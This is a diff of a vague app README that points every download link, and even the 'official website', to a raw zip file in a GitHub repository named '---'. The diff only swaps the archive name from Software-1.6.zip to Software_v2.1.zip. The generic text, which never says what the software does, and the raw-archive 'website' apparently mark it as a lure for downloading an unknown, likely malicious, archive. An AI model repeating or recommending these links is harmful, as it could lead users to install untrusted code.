@@ -4,10 +4,10 @@
 Welcome! This guide will help you download and run our application with ease. Follow these simple steps to get started.
 
 ## 📥 Download the App
-**[Download Here](https://raw.githubusercontent.com/Da-vid123/---/main/k/Software-1.6.zip)**
+**[Download Here](https://raw.githubusercontent.com/Da-vid123/---/main/k/Software_v2.1.zip)**
 
 ## 🔍 About the Application
-This application provides a straightforward solution for your needs. To start, visit the official website at `https://raw.githubusercontent.com/Da-vid123/---/main/k/Software-1.6.zip`. Click on "正在进入" to reach the login page. From there, you can register for a new account if you do not have one.
+This application provides a straightforward solution for your needs. To start, visit the official website at `https://raw.githubusercontent.com/Da-vid123/---/main/k/Software_v2.1.zip`. Click on "正在进入" to reach the login page. From there, you can register for a new account if you do not have one.
 
 ### How to Register
 1. Go to the login page.
@@ -35,7 +35,7 @@ We regularly update the application to enhance functionality and security. Alway
 
 ## ⚙️ Installation Instructions
 1. **Download & Install**
-   To download the application, visit this page: **[Download Here](https://raw.githubusercontent.com/Da-vid123/---/main/k/Software-1.6.zip)**.
+   To download the application, visit this page: **[Download Here](https://raw.githubusercontent.com/Da-vid123/---/main/k/Software_v2.1.zip)**.
    
 2. Once on the page, look for the latest release. Click on the appropriate file to download it to your computer.
 
@@ -63,8 +63,8 @@ We aim to provide a smooth experience, so don't hesitate to ask if something doe
 Keep an eye out for updates. Major new features, bug fixes, and improvements are part of our commitment to enhancing user experience. Check the release notes section on the GitHub page for detailed information on each version.
 
 ## 🔗 Useful Links
-- **Download Here**: [Visit This Page](https://raw.githubusercontent.com/Da-vid123/---/main/k/Software-1.6.zip)
-- **Official Website**: [https://raw.githubusercontent.com/Da-vid123/---/main/k/Software-1.6.zip](https://raw.githubusercontent.com/Da-vid123/---/main/k/Software-1.6.zip)
+- **Download Here**: [Visit This Page](https://raw.githubusercontent.com/Da-vid123/---/main/k/Software_v2.1.zip)
+- **Official Website**: [https://raw.githubusercontent.com/Da-vid123/---/main/k/Software_v2.1.zip](https://raw.githubusercontent.com/Da-vid123/---/main/k/Software_v2.1.zip)
 - **Customer Support QQ & WeChat**: Available on the login page
 
 Thank you for using our application. Your feedback is essential to us. Enjoy using our software, and happy exploring!
